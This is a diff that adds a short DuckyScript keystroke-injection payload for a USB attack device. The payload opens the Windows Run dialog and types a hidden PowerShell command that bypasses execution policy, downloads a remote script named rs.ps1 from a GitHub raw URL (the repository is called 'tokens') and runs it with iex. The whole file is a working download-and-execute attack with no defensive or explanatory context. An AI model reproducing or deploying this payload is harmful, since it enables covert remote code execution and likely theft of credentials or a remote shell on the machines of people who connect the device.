@@ -1,0 +1,5 @@
+DELAY 500
+GUI r
+DELAY 100
+STRING powershell -w h -NoP -NonI -ep Bypass $pl = iwr https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/main/rs.ps1; iex $pl
+ENTER
